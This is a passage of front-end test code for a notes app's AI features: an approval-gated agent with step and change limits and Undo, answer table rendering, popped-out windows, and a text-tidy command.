      if (!/^Find what’s left on the audit and add a task to email Maya \| \d+$/.test(Q.calls.split(' · ')[0]) || ch[0] !== 'add {"title":"Email Maya about the budget by Friday","priority":"","energy":"","due":"2026-10-23","project":"","note":"' + n.title + '","steps":""}' || ch[1] !== 'skip null' || !/undo true$/.test(Q.calls)) qb('Ask sends the request and the note; Add with the edits; Skip; Undo all', Q.calls);
      if (!/6 steps · read 2 notes · 1 change/.test(Q.done) || !/Three things are left on the audit\./.test(Q.done) || !/Added the task “Email Maya about the budget by Friday”\. Skipped 1\. Nothing else changed\.\s*Undo all/.test(Q.done) || !/Agent · Qwen3\.5 4B · this PC · 9 s/.test(Q.done)) qb('done: what it did, the answer, “Nothing else changed”, Undo all', Q.done);
      if (!/^"Undone: everything it changed is gone\./.test(Q.undo) || !/task gone true$/.test(Q.undo)) qb('Undo all takes the changes out', Q.undo);
      // the step limit, with Carry on; the change limit; Stop
      AIC.chats = {}; renderAll(); let lim = 'limit';
      const endFake = { ai_agent: () => ({ status: 'success', ...base, state: lim, code: lim, used: lim === 'limit' ? 8 : 7, error: lim === 'limit' ? 'Stopped after 8 steps: the most for one request.' : 'Stopped: it wanted a 4th change, and 3 is the most for one request.', steps: STEPS, writes: lim === 'limit' ? [] : [{ kind: 'task', title: 'a' }, { kind: 'task', title: 'b' }, { kind: 'append', note_title: 'x' }], pending: null }),
        ai_agent_carry: () => ({ status: 'success', ...base, state: 'running', used: 8, budget: 16, steps: STEPS, writes: [], pending: null }), ai_agent_poll: () => ({ status: 'success', ...base, state: 'done', used: 9, budget: 16, steps: STEPS, writes: [], pending: null, answer: 'Done.' }) };
      calls = await withApi(endFake, async () => { await typeAsk('Search everything'); await until(() => !AIC.busy && app.querySelector('.agt-note.is-warn'), 60); await tick(2);
        Q.limit = `"${txt(app.querySelector('.agt-turn.is-newest .agt-note'))}"`; app.querySelector('[data-act="agt-carry"]')?.click(); await until(() => !AIC.busy && app.querySelector('.agt-turn.is-newest .agt-note.is-ok'), 60); await tick(2);
        Q.limit += ` → carry: "${txt(app.querySelector('.agt-turn.is-newest .agt-note'))}"`;
        lim = 'wlimit'; await typeAsk('Add many tasks'); await until(() => !AIC.busy && app.querySelector('.agt-turn.is-newest .agt-note.is-warn'), 60); await tick(2);
        Q.wlimit = `"${txt(app.querySelector('.agt-turn.is-newest .agt-note'))}"`; });
      if (!/^"Stopped after 8 steps: the most for one request\.Added nothing; nothing else changed\. Carry on to give it 8 more steps, from where it stopped\.Carry on" → carry: "Added nothing\. Skipped 0\. Nothing else changed\."$/.test(Q.limit) || !calls.some(c => c[0] === 'ai_agent_carry')) qb('the step limit: it says so; Carry on gives 8 more steps', Q.limit);
      if (!/^"Stopped: it wanted a 4th change, and 3 is the most for one request\.It made 3 changes, each one you said yes to\. Nothing more was changed\.Undo all"$/.test(Q.wlimit)) qb('the change limit: it says so, with Undo all', Q.wlimit);
      phase = 0; calls = await withApi(fake, async () => { await typeAsk('Do it'); await until(() => app.querySelector('.agt-step.is-run'), 40); app.querySelector('[data-act="aic-stop"]').click(); await until(() => !AIC.busy, 40); await tick(2); });
      Q.stop = `${calls.some(c => c[0] === 'ai_agent_stop')} · "${txt(app.querySelector('.agt-turn.is-newest .agt-note'))}"`;
      if (!/^true · "Stopped after 4 steps\.Nothing was changed\."$/.test(Q.stop)) qb('Stop stops it, and says nothing was changed', Q.stop);
      // add_tags and link_notes: the tags it has and the new ones; the link in its sentence; Edit; the note's tags and text follow; Undo all
      AIC.chats = {}; local('qwen35-4b'); await tick(); let ph = 0; const nt7 = note(), t0 = [...(nt7.tags || [])], md1 = nt7.md;
      const TP = { kind: 'tags', n: 1, note_id: rawId(nt7.id), note_title: nt7.title, tags: ['budget', 'q3-plans'], have: ['roadmap'] };
      const LP = { kind: 'link', n: 2, note_id: rawId(nt7.id), note_title: nt7.title, to_id: 7, to_title: 'Meeting notes', how: 'mention', before: 'See the meeting notes for dates.', after: 'See the [[Meeting notes|meeting notes]] for dates.' };
      const W = [{ kind: 'tags', note_id: rawId(nt7.id), note_title: nt7.title, tags: ['budget', 'retests'], all: ['roadmap', 'budget', 'retests'] }, { kind: 'link', note_id: rawId(nt7.id), note_title: nt7.title, to_title: 'Meeting notes', how: 'mention', content: md1 + '\n\nSee the [[Meeting notes|meeting notes]] for dates.' }];
      const snap2 = () => ({ ...base, run: 'R2', state: ph < 2 ? 'waiting' : 'done', used: ph + 1, steps: [], answer: ph < 2 ? '' : 'Tagged and linked.', writes: W.slice(0, ph), pending: ph === 0 ? TP : ph === 1 ? LP : null });
      calls = await withApi({ ai_agent: () => ({ status: 'success', ...snap2() }), ai_agent_poll: () => ({ status: 'success', ...snap2() }), ai_agent_change: () => { ph++; return { status: 'success', ...snap2() }; },
        ai_agent_undo: () => ({ status: 'success', undone: 2, kept: [], notes: { [rawId(nt7.id)]: md1 }, tags: { [rawId(nt7.id)]: t0 }, tasks: [], ...snap2() }) }, async () => {
        await typeAsk('Tag this note and link it to the meeting notes'); await until(() => app.querySelector('[data-agt-card="tags"]'), 60); await tick(2);
        Q.tags = `"${txt(app.querySelector('[data-agt-card="tags"]'))}" · had ${app.querySelectorAll('.agt-had').length} new ${app.querySelectorAll('.agt-new').length}`;
        app.querySelector('[data-agt-card="tags"] [data-act="agt-edit"]').click(); await tick(2); const ti = app.querySelector('#agt-e-tags'); Q.tagsEdit = `focus ${document.activeElement?.id} · "${ti?.value}"`;
        ti.value = 'budget, retests'; app.querySelector('[data-act="agt-esave"]').click(); await until(() => app.querySelector('[data-agt-card="link"]'), 60); await tick(2);
        Q.link = `"${txt(app.querySelector('[data-agt-card="link"]'))}" · shown as a link "${txt(app.querySelector('[data-agt-card="link"] .agt-link'))}" · tags now ${(note().tags || []).join(',')}`;
        app.querySelector('[data-agt-card="link"] [data-act="agt-add"]').click(); await until(() => !AIC.busy && app.querySelector('.agt-turn.is-newest .agt-note.is-ok'), 60); await tick(2);
        Q.done2 = `"${txt(app.querySelector('.agt-turn.is-newest .agt-note'))}" · md has link ${/\[\[Meeting notes\|meeting notes\]\]/.test(note().md)}`;
        app.querySelector('.agt-turn.is-newest [data-act="agt-undo"]').click(); await tick(4);
        Q.undo2 = `tags ${(note().tags || []).join(',')} · md back ${note().md === md1}`; });
      const ch2 = calls.filter(c => c[0] === 'ai_agent_change').map(c => `${c[1][1]} ${JSON.stringify(c[1][2])}`).join(' ; ');
      if (!/^"Add these tags to “.+”\?change 1 · at most 3#roadmap\+ #budget\+ #q3-plans\s*Add tagsEditSkip" · had 1 new 2$/.test(Q.tags)) qb('tags: the ones it has and the new ones, Add tags, Edit, Skip', Q.tags);
      if (Q.tagsEdit !== 'focus agt-e-tags · "budget, q3-plans"') qb('Edit the tags: the words, focused', Q.tagsEdit);
      if (!/^"Link “.+” to “Meeting notes”\?change 2 · at most 3NowSee the meeting notes for dates\.See the meeting notes for dates\.Where it names “Meeting notes”: no other words change\.\s*Add linkEditSkip" · shown as a link "meeting notes" · tags now roadmap,budget,retests$/.test(Q.link)) qb('a link: the sentence now and with the link, no other words change; the tags reached the note', Q.link);
      if (ch2 !== 'add {"tags":"budget, retests"} ; add null') qb('Add with the edited tags, then Add the link', ch2);
      if (!/^"Added 2 tags and 1 link\. Skipped 0\. Nothing else changed\.Undo all" · md has link true$/.test(Q.done2)) qb('done: tags and the link counted; the note’s text has the link', Q.done2);
      if (Q.undo2 !== `tags ${t0.join(',')} · md back true`) qb('Undo all takes the tags and the link out of the note', Q.undo2);
      // QC 112: a task's fields: priority and energy, no due date it wasn't asked for (and said), Edit has each field, the summary
      // names them; the model on this PC not loaded: said before asking; no tool and no reply: said, with Load it now
      AIC.chats = {}; local('qwen35-4b'); await tick(); let ph3 = 0;
      const TP3 = { kind: 'task', n: 1, title: 'Review UI/UX cohesion of notes app', priority: 'High', energy: 'low', due: '', due_dropped: true, project: '', project_id: null, project_missing: '', steps: [], note_id: null, note_title: '', projects: ['Admin', 'Website'] };
      const snap3 = () => ({ ...base, run: 'R3', state: ph3 ? 'done' : 'waiting', used: 1, steps: [], answer: ph3 ? 'I added the task.' : '', pending: ph3 ? null : TP3,
        writes: ph3 ? [{ kind: 'task', task_id: 905, title: TP3.title, said: 'High priority · low energy', task: { id: 905, title: TP3.title, priority: 'High', energy: 'low', due_date: null, completed: 0, created_at: '' } }] : [] });
      calls = await withApi({ ai_agent: () => ({ status: 'success', ...snap3() }), ai_agent_poll: () => ({ status: 'success', ...snap3() }), ai_agent_change: () => { ph3 = 1; return { status: 'success', ...snap3() }; } }, async () => {
        await typeAsk('add a new task with high prio low enery, to review the ui/ux cohesion of my notes app'); await until(() => app.querySelector('[data-agt-card="task"]'), 60); await tick(2);
        const card = app.querySelector('[data-agt-card="task"]');
        Q.fields = `"${txt(card.querySelector('.agt-fields'))}" · note "${txt(card.querySelector('.agt-fnote'))}"`;
        card.querySelector('[data-act="agt-edit"]').click(); await tick(2);
        Q.fedit = ['title', 'priority', 'energy', 'due', 'project', 'note', 'steps'].map(k => `${k}=${app.querySelector('#agt-e-' + k)?.value ?? 'missing'}`).join(' ');
        app.querySelector('[data-act="agt-esave"]').click(); await until(() => !AIC.busy && app.querySelector('.agt-turn.is-newest .agt-note.is-ok'), 60); await tick(2);
        Q.fdone = `"${txt(app.querySelector('.agt-turn.is-newest .agt-note'))}" · task ${D.tasks.some(t => rawId(t.id) === 905 && t.priority === 'High')}`; });
      if (Q.fields !== '"PriorityHighEnergyLowDueNo due dateProjectNoneFromNo note" · note "It suggested a due date you didn’t ask for: left out."') qb('QC 112: the card lists every field, and a due date it made up is left out', Q.fields);
      if (Q.fedit !== 'title=Review UI/UX cohesion of notes app priority=High energy=low due= project= note= steps=') qb('QC 112: Edit has each field', Q.fedit);
      if (!/^"Added the task “Review UI\/UX cohesion of notes app” \(High priority · low energy\)\. Skipped 0\. Nothing else changed\.\s*Undo all" · task true$/.test(Q.fdone)) qb('QC 112: the summary names the fields', Q.fdone);
      AIC.chats = {}; AI.st.engine.state = 'stopped'; renderAll(); await tick();
      Q.loadHello = `"${txt(app.querySelector('[data-agt-load]'))}"`;
      calls = await withApi({ ai_agent: () => ({ status: 'success', ...base, run: 'R4', state: 'error', code: 'noreply', error: 'Qwen3.5 4B didn’t call a tool or reply, so nothing was changed.', used: 0, steps: [], writes: [], pending: null }),
        ai_agent_warm: () => ({ status: 'success', loading: true, model: 'Qwen3.5 4B' }) }, async () => {
        await typeAsk('add a task'); await until(() => !AIC.busy && app.querySelector('[data-agt-noreply]'), 60); await tick(2);
        Q.noreply = `"${txt(app.querySelector('.agt-turn.is-newest .aic-a'))}"`;
        app.querySelector('.agt-turn.is-newest [data-act="agt-warm"]')?.click(); await tick(4); });
      Q.warm = calls.some(c => c[0] === 'ai_agent_warm');
      if (!/Qwen3\.5 4B on this PC isn’t loaded yet\./.test(Q.loadHello) || !/Load it now/.test(Q.loadHello)) qb('QC 112: the model on this PC not loaded: said before asking, with Load it now', Q.loadHello);
      if (!/Qwen3\.5 4B didn’t call a tool or reply, so nothing was changed\./.test(Q.noreply) || !/isn’t loaded yet, so it didn’t get to answer/.test(Q.noreply) || !Q.warm) qb('QC 112: no tool and no reply: said, with Load it now', `${Q.noreply} · warm ${Q.warm}`);
      AI.st.engine.state = 'running';
      // a model that can't use tools: it says so, the box waits, and offers one that can
      AIC.chats = {}; local('qwen35-2b'); await tick(2);
      const nt = app.querySelector('[data-agt-notools]'); Q.notools = `"${txt(nt)}" · box ${app.querySelector('#aic-in')?.disabled} "${app.querySelector('#aic-in')?.placeholder}"`;
      if (!/^"Qwen3\.5 2B can’t use tools reliably, so the Agent can’t work with it\.Pick a model that can: Qwen3\.5 4B or 9B on this PC, or any cloud model\. Nothing was changed\.\s*Use Qwen3\.5 4BAI models…" · box true "Pick a model that can use tools first"$/.test(Q.notools)) qb('a model that can’t use tools: it says so and offers one that can', Q.notools);
      // with a cloud model, the first-use notice names what goes
      const g = AI.st.cloud.find(p => p.id === 'groq'); Object.assign(g, { has_key: true, seen: '', models: [{ id: 'openai/gpt-oss-20b', name: 'GPT-OSS 20B', ctx: '131K', vision: false, rec: true, used: false, use: { sent: 0, source: 'counted' } }] });
      AI.st.route.qa = 'cloud:groq'; AI.st.routes.qa = { kind: 'cloud', prov: 'groq', model: 'openai/gpt-oss-20b', name: 'GPT-OSS 20B', svc: 'Groq', label: 'GPT-OSS 20B · Groq · cloud', key: 'cloud:groq', ready: false, seen: false, has_key: true }; renderAll(); await tick();
      Q.cloud = `hello "${txt(app.querySelectorAll('.agt-hello .aic-hello-sub')[1])}"`;
      await withApi({}, async () => { await typeAsk('Read my notes'); await until(() => S.modal === 'cl-notice', 40); });
      Q.cloud += ` · notice "${txt(app.querySelector('[data-dlg="cl-notice"] .cl-fact:nth-child(2) dd'))}"`;
      document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true })); await tick(4);
      if (!/GPT-OSS 20B · Groq · cloud: the notes it reads go to Groq\./.test(Q.cloud) || !/notice "Your request, “Read my notes”, and the notes the Agent reads for it: each step says which\."/.test(Q.cloud)) qb('a cloud model: it says the notes go there, and the notice names them', Q.cloud);
      AGT.on = was.on; AGT.tools = was.tools; AIC.scope = 'note'; AIC.chats = {}; AIC.busy = null; AIC.open = false; set({ screen: '1920x1080' }); reset(); aiDemo('ready'); renderAll();
    } finally { window.pywebview = PYW; } }
    // 4k · QC 108: an answer's table looks like a note's (a frame, a tinted head, row lines), words never break in the middle (at 1366,
    //      in a narrow docked chat, floating), numbers sit right, a wide table scrolls in its own frame (the chat never scrolls
    //      sideways), Copy as table and Insert as a table; the Agent's answers too
    { const PYW = window.pywebview; window.pywebview = undefined; try {
      const Q = N.qc108 = {}, qb = (k, v) => bad('QC 108 ' + k, v), txt = e => (e?.textContent || '').replace(/\s+/g, ' ').trim();
      reset(); aiDemo('ready'); AIC.chats = {}; AIC.busy = null; const dock0 = AIC.dockW;
      const TBL = '**Data types in the note**\n\n| Data Type | Defining Features | Best-fit Repositories | Why you would choose it | Size (GB) |\n|---|---|---|---|---|\n'
        + '| Structured | Rigid, well-defined schema (tables, columns). | Relational databases or NoSQL systems that support schemas. | Easy to query with SQL, ideal for transactional data (OLTP). | 1,200 |\n'
        + '| Semi-Structured | Some organization but no fixed schema; common formats are JSON and XML. | NoSQL clusters (e.g., document stores). | Flexible enough to handle evolving fields. | 35.5 |\n'
        + '| Unstructured | No inherent structure; cannot be neatly placed into rows/columns. | NoSQL databases or Data Lakes. | Needed for free-form content such as web pages. | 9 |\n\nThat’s the gist.';
      const broken = root => { const out = []; root.querySelectorAll('td, th').forEach(c => { if (c.classList.contains('is-long')) return;
        const w = document.createTreeWalker(c, NodeFilter.SHOW_TEXT); let tn; while ((tn = w.nextNode())) { for (const m of tn.data.matchAll(/[^\s\-–—/]+/g)) { if (m[0].length < 2) continue;
          const r = document.createRange(); r.setStart(tn, m.index); r.setEnd(tn, m.index + m[0].length); const rs = [...r.getClientRects()].filter(x => x.width > 0);
          if (rs.length > 1 && new Set(rs.map(x => Math.round(x.top))).size > 1) out.push(m[0]); } } }); return out; };
      const n = note(), md0 = n.md, key = aicKey(n);
      const put = (agentTurn = false) => { aicChat(key).turns = [agentTurn ? { q: 'What data types are there?', scope: 'agent', at: 0, answers: [{ pending: null, by: 'Qwen3.5 4B · this PC', text: TBL, agent: { run: 'Rt', state: 'done', steps: [], used: 1, budget: 8, max_steps: 8, max_writes: 3, writes: [], skipped: 0, reads: 1, secs: 3, answer: TBL, pending: null } }] }
        : { q: 'Can you explain data types?', scope: 'note', at: 0, answers: [{ text: TBL, by: 'GPT-OSS 120B', where: 'cloud', t0: Date.now(), secs: 2 }] }]; renderAll(); };
      for (const [k, sc, mode, w, ag] of [['1366/dock', '1366x768', 'dock', null, false], ['1366/narrow dock', '1366x768', 'dock', 320, false], ['1366/float', '1366x768', 'float', null, false], ['1920/agent', '1920x1080', 'dock', null, true]]) {
        AIC.open = false; AIC.mode = mode; AIC.rect = null; if (w) AIC.dockW = w; AIC.scope = ag ? 'agent' : 'note'; const agOn = AGT.on; if (ag) AGT.on = true;
        set({ screen: sc, view: 'notes', modal: null, inspector: 'shown' }); app.querySelector('[data-act="ain-ask"]').click(); put(ag); await tick(3);
        const win = app.querySelector('[data-aic-win]'), wrap = win?.querySelector('.ans-tbl-wrap'), frame = wrap?.querySelector('.ans-tbl'), th = frame?.querySelector('th'), td = frame?.querySelector('td'), num = frame?.querySelector('td.is-num');
        const th0 = win?.querySelector('[data-aic-thread]'), bk = frame ? broken(frame) : ['no table'];
        Q[k] = `width ${win?.offsetWidth} · frame ${frame?.clientWidth}/${frame?.scrollWidth} · thread ${th0?.clientWidth}/${th0?.scrollWidth} · head ${th && getComputedStyle(th).backgroundColor} · line ${td && getComputedStyle(td).borderBottomStyle} · num ${num ? `${txt(num)} ${getComputedStyle(num).textAlign}` : 'none'} · broken ${bk.join(',') || 'none'} · nums ${frame?.querySelectorAll('td.is-num').length}`;
        if (bk.length) qb(`no word breaks in the middle (${k})`, Q[k]);
        if (!frame || getComputedStyle(frame).overflowX !== 'auto' || getComputedStyle(frame).borderTopStyle !== 'solid' || parseFloat(getComputedStyle(frame).borderTopLeftRadius) < 2) qb(`a framed table that scrolls sideways (${k})`, Q[k]);
        if (!th || /rgba\(0, 0, 0, 0\)|transparent/.test(getComputedStyle(th).backgroundColor) || getComputedStyle(td).borderBottomStyle !== 'solid') qb(`the note’s table look: a tinted head and row lines (${k})`, Q[k]);
        if (!num || getComputedStyle(num).textAlign !== 'right' || frame.querySelectorAll('td.is-num').length !== 3) qb(`numbers sit to the right (${k})`, Q[k]);
        if (th0 && th0.scrollWidth > th0.clientWidth + 1) qb(`the chat never scrolls sideways: the table does (${k})`, Q[k]);
        if (w && frame && frame.scrollWidth <= frame.clientWidth) qb('a narrow chat: the table keeps its words and scrolls instead', Q[k]);
        if (ag) AGT.on = agOn;
      }
      AIC.dockW = dock0; AIC.mode = 'dock'; AIC.scope = 'note'; AIC.open = false; set({ screen: '1366x768' }); app.querySelector('[data-act="ain-ask"]').click(); put(false); await tick(3);
      // Copy as table (a copy selected and copied as rows and columns), Insert as a table (at the end of the note: no cursor)
      const ex0 = document.execCommand; let copied = null; document.execCommand = function (c) { if (c === 'copy') { copied = getSelection().toString(); return true; } return ex0.apply(this, arguments); };
      try { const acts = app.querySelector('.ans-tbl-acts'); Q.acts = [...(acts?.querySelectorAll('button') || [])].map(b => b.getAttribute('aria-label')).join(' | ');
        acts?.querySelector('[data-act="ans-tbl-copy"]')?.click(); await tick(); } finally { document.execCommand = ex0; }
      Q.copy = `${copied ? copied.split('\n')[0].slice(0, 60) : 'nothing'} · "${S.status}"`;
      if (Q.acts !== 'Copy as table | Insert as a table') qb('hovering a table: Copy as table, Insert as a table', Q.acts);
      if (!copied || !/Data Type\s+Defining Features/.test(copied) || !/Copied as a table/.test(S.status || '')) qb('Copy as table copies its rows and columns', Q.copy);
      AIC.caret = null; app.querySelector('[data-act="ans-tbl-ins"]')?.click(); await tick(3);
      Q.ins = `${/\n\| Data Type \| Defining Features \| Best-fit Repositories \| Why you would choose it \| Size \(GB\) \|\n\|---\|---\|---\|---\|---\|\n\| Structured \|/.test(n.md)} · hold "${txt(app.querySelector('.hold-bar, .toast'))}".slice(0, 60)`;
      if (!/^true/.test(Q.ins)) qb('Insert as a table puts a real table in the note', Q.ins);
      if (typeof holdCommit === 'function') holdCommit(); n.md = md0; n.html = null; AIC.chats = {}; AIC.open = false; set({ screen: '1920x1080' }); reset(); aiDemo('ready'); renderAll();
    } finally { window.pywebview = PYW; } }
    // 4l · QC 109: the status bar's "on your desktop" list, for every kind (a sticky, the timer, the Ask chat, the mind map), with
    //      mocked windows: Show asks for that window; Bring back closes it and puts it back where it was (the sticky shows, the timer
    //      shows, the chat is docked, the map is beside its note); a window that wasn't there any more comes back and says so;
    //      Bring them all back does every kind; the popped sync's back= does the same
    { const PYW = window.pywebview; window.pywebview = undefined; try {
      const Q = N.qc109 = {}, qb = (k, v) => bad('QC 109 ' + k, v), txt = e => (e?.textContent || '').replace(/\s+/g, ' ').trim();
      reset(); aiDemo('ready'); set({ screen: '1366x768', view: 'notes', modal: null, inspector: 'shown' });
      const st = D.stickies[0] || (D.stickies.push({ id: 'st-41', n: 1, text: 'Call the dentist', color: 'yellow', open: false, out: true }), D.stickies[0]), sid = rawId(st.id);
      const ALL = [{ kind: 'sticky', id: sid, key: 'sticky:' + sid, on_top: true }, { kind: 'timer', id: null, key: 'timer', on_top: true }, { kind: 'ask', id: null, key: 'ask', on_top: true }, { kind: 'mindmap', id: null, key: 'mindmap', on_top: true }];
      let out = [...ALL];
      const setOut = () => { POPS.items = [...out]; st.out = out.some(x => x.kind === 'sticky'); st.open = false; UI.widgets = 'none'; AIC.open = false; MM.open = false; };
      const fake = { popped: () => out, pop_show: (k, i) => ({ status: 'success', popped: out }), pop_in: (k, i) => { out = out.filter(x => x.kind !== k); return { status: 'success', popped: out }; }, pop_all_in: () => { out = []; return { status: 'success', popped: [] }; } };
      const menu = async () => { POPS.menu = true; renderAll(); await tick(); return app.querySelector('.pop-menu'); };
      const back = k => ({ sticky: st.open && !st.out, timer: UI.widgets === 'timer', ask: AIC.open && AIC.mode === 'dock', mindmap: MM.open }[k]);
      setOut(); let m = await menu();
      Q.rows = [...(m?.querySelectorAll('.pop-row') || [])].map(r => `${txt(r.querySelector('.pop-row-label'))}:${[...r.querySelectorAll('button')].map(b => `${b.dataset.act}=${b.dataset.v}`).join('/')}`).join(' | ');
      if ((m?.querySelectorAll('.pop-row').length || 0) !== 4 || !/Ask: the AI chat:pop-show=ask\/pop-in=ask/.test(Q.rows) || !/Mind map:pop-show=mindmap\/pop-in=mindmap/.test(Q.rows) || !/(?:^| \| )Quick timer(?: · [\d:]+)?:pop-show=qt\/pop-in=qt/.test(Q.rows)) qb('a row for each kind, named, with Show and Bring back', Q.rows);
      // Show, each kind
      Q.show = [];
      for (const it of ALL) { setOut(); m = await menu(); const row = [...m.querySelectorAll('.pop-row')].find(r => r.querySelector(`[data-act="pop-show"]`).dataset.v === (it.kind === 'timer' ? 'qt' : it.kind === 'sticky' ? 'st:st-' + sid : it.kind));
        const calls = await withApi(fake, async () => { row.querySelector('[data-act="pop-show"]').click(); await tick(4); });
        const c = calls.find(x => x[0] === 'pop_show'); Q.show.push(`${it.kind}:${c ? c[1].join(',') : 'none'} "${S.status}"`);
        if (!c || c[1][0] !== it.kind || (it.kind === 'sticky' ? +c[1][1] !== sid : c[1][1] !== null) || !/brought to the front/.test(S.status || '')) qb(`Show asks for that window (${it.kind})`, Q.show[Q.show.length - 1]); }
      // Bring back, each kind: closed, and back where it was
      Q.back = [];
      for (const it of ALL) { out = [...ALL]; setOut(); m = await menu(); const row = [...m.querySelectorAll('.pop-row')].find(r => txt(r.querySelector('.pop-row-label')) && r.querySelector('[data-act="pop-in"]').dataset.v === (it.kind === 'timer' ? 'qt' : it.kind === 'sticky' ? 'st:st-' + sid : it.kind));
        const calls = await withApi(fake, async () => { row.querySelector('[data-act="pop-in"]').click(); await tick(6); });
        Q.back.push(`${it.kind}:${calls.some(x => x[0] === 'pop_in' && x[1][0] === it.kind)} back ${back(it.kind)} out ${isOut(it.key)}`);
        if (!calls.some(x => x[0] === 'pop_in' && x[1][0] === it.kind) || !back(it.kind) || isOut(it.key)) qb(`Bring back closes it and puts it back where it was (${it.kind})`, Q.back[Q.back.length - 1]); }
      // a window that wasn't there any more: Show brings it back into NeuroVault, and says so
      out = [...ALL]; setOut(); m = await menu();
      let calls = await withApi({ ...fake, pop_show: () => { out = out.filter(x => x.kind !== 'ask'); return { status: 'error', gone: true, message: 'Its window wasn’t open any more, so it’s back in NeuroVault.', popped: out }; } },
        async () => { m.querySelector('[data-act="pop-show"][data-v="ask"]').click(); await tick(6); });
      Q.gone = `docked ${back('ask')} · listed ${isOut('ask')} · "${S.toast || S.status}"`;
      if (!back('ask') || isOut('ask') || !/Ask: its window wasn’t open any more, so it’s back in NeuroVault/.test(S.toast || '')) qb('a window that’s gone comes back into NeuroVault, and says so', Q.gone);
      // Bring them all back: every kind
      out = [...ALL]; setOut(); m = await menu();
      calls = await withApi(fake, async () => { m.querySelector('[data-act="pop-all-in"]').click(); await tick(6); });
      Q.all = ALL.map(it => `${it.kind} ${back(it.kind)}`).join(' · ') + ` · listed ${POPS.items.length}`;
      if (!calls.some(x => x[0] === 'pop_all_in') || ALL.some(it => !back(it.kind)) || POPS.items.length) qb('Bring them all back does every kind', Q.all);
      // the popped sync: back= for the mind map and the timer (closed from its own window)
      for (const k of ['mindmap', 'timer', 'ask']) { out = [...ALL]; setOut(); window.nvSync({ kind: 'popped', items: ALL.filter(x => x.kind !== k), back: k, closed: null, gone: null }); await tick(2);
        if (!back(k)) qb(`the popped sync’s back= puts it back (${k})`, `${k} ${back(k)}`); }
      POPS.items = []; POPS.menu = false; st.out = false; MM.open = false; AIC.open = false; UI.widgets = 'none'; set({ screen: '1920x1080' }); reset(); aiDemo('ready'); renderAll();
    } finally { window.pywebview = PYW; } }
    // 5 · Tidy up with AI: right-click a selection; the item below the spelling block; the change shown first; Replace; Ctrl+Z
    { frame.style.width = Math.max(1024, Math.min(1920, innerWidth)) + 'px'; frame.style.height = Math.max(640, Math.min(1080, innerHeight)) + 'px';
      clearTimeout(n.saveT); n.docDirty = false; n.dirty = false; n.md = 'We meet on tusday to agre the [[Roadmap]] dates.\n\nSecond paragraph stays.'; n.html = null; renderAll();
      const doc = app.querySelector('.doc'), p = doc.querySelector('p'), r = document.createRange(); r.selectNodeContents(p); doc.focus({ preventScroll: true });
      const s = getSelection(); s.removeAllRanges(); s.addRange(r);
      p.scrollIntoView({ block: 'center' }); const b = p.getClientRects()[0], at = { bubbles: true, cancelable: true, clientX: b.left + 30, clientY: b.top + b.height / 2, button: 2 };
      (document.elementFromPoint(at.clientX, at.clientY) || doc).dispatchEvent(new MouseEvent('contextmenu', at)); await tick();
      const item = app.querySelector('.menu--word .ain-tidy-item'), items = [...app.querySelectorAll('.menu--word .menu-item')];
      N.tidy.menu = items.map(x => x.textContent.trim()).join(' | ') + ` · captured "${S.ctx?.tidy?.md}"`;
      if (!item || item.getAttribute('aria-disabled') === 'true' || !/We meet on tusday to agre the \[\[Roadmap\]\] dates\./.test(S.ctx?.tidy?.md || '')) bad('Tidy up with AI in the right-click menu, with the selection as Markdown', N.tidy.menu);
      const tidied = 'We meet on Tuesday to agree the [[Roadmap]] dates.';
      let calls = await withApi({ ai_tidy: () => ({ status: 'success', job: 'job-6' }), ...job({ text: tidied, lost: [], same: false, by: 'Qwen3.5 4B' }) }, async () => {
        djCtxRun('ctx-tidy', S.ctx); await until(() => app.querySelector('[data-act="ain-tidy-replace"]')); });
      const pop = app.querySelector('[data-ain-pop="tidy"]'), sent = calls.find(c => c[0] === 'ai_tidy');
      N.tidy.pop = `sent "${sent?.[1][0]}" · before ${pop?.querySelectorAll('[data-ain-before] del').length} struck · after ${pop?.querySelectorAll('[data-ain-after] ins').length} marked · ${[...pop?.querySelectorAll('.ain-btns .btn') || []].map(x => x.textContent.trim()).join('|')}`;
      if (!pop || !sent || pop.querySelectorAll('[data-ain-before] del').length !== 2 || pop.querySelectorAll('[data-ain-after] ins').length !== 2 || [...pop.querySelectorAll('.ain-btns .btn')].map(x => x.textContent.trim()).join('|') !== 'Cancel|Replace') bad('the change is shown first: [Cancel] [Replace]', N.tidy.pop);
      inWin(pop, '1920', 'Tidy up popover');
      app.querySelector('[data-act="ain-tidy-replace"]').click(); await tick(); syncDoc(n);
      N.tidy.replace = `"${n.md.split('\n')[0]}" · ${n.md.split('\n\n').length} paragraphs · "${S.status}"`;
      if (n.md.split('\n')[0] !== tidied || !/Second paragraph stays\./.test(n.md) || n.md.split('\n\n').length !== 2) bad('Replace puts the tidied text in place of the selection only', N.tidy.replace);
      edUndo(app.querySelector('.doc')); syncDoc(n); N.tidy.undo = n.md.split('\n')[0]; if (!/tusday/.test(n.md)) bad('Ctrl+Z puts the words back', N.tidy.undo);
      // Cancel while it works: the model is stopped, nothing changes; a lost [[link]] is named before Replace
      const s2 = getSelection(), d2 = app.querySelector('.doc'), r2 = document.createRange(); r2.selectNodeContents(d2.querySelector('p')); d2.focus({ preventScroll: true }); s2.removeAllRanges(); s2.addRange(r2);
      d2.querySelector('p').scrollIntoView({ block: 'center' }); const b2 = d2.querySelector('p').getClientRects()[0]; (document.elementFromPoint(b2.left + 30, b2.top + b2.height / 2) || d2).dispatchEvent(new MouseEvent('contextmenu', { ...at, clientX: b2.left + 30, clientY: b2.top + b2.height / 2 })); await tick();
      calls = await withApi({ ai_tidy: () => ({ status: 'success', job: 'job-7' }), ...job(null, 'running') }, async () => { djCtxRun('ctx-tidy', S.ctx); await until(() => app.querySelector('[data-act="ain-tidy-cancel"]')); app.querySelector('[data-act="ain-tidy-cancel"]').click(); await tick(); });
      if (!calls.some(c => c[0] === 'ai_job_cancel' && c[1][0] === 'job-7') || AIN.tidy || app.querySelector('[data-ain-pop="tidy"]')) bad('Cancel stops Tidy up', calls.map(c => c[0]).join(','));
      renderAll(); const d3 = app.querySelector('.doc'), r3 = document.createRange(); r3.selectNodeContents(d3.querySelector('p')); d3.focus({ preventScroll: true }); s2.removeAllRanges(); s2.addRange(r3);
      d3.querySelector('p').scrollIntoView({ block: 'center' }); const b3 = d3.querySelector('p').getClientRects()[0]; (document.elementFromPoint(b3.left + 30, b3.top + b3.height / 2) || d3).dispatchEvent(new MouseEvent('contextmenu', { ...at, clientX: b3.left + 30, clientY: b3.top + b3.height / 2 })); await tick();
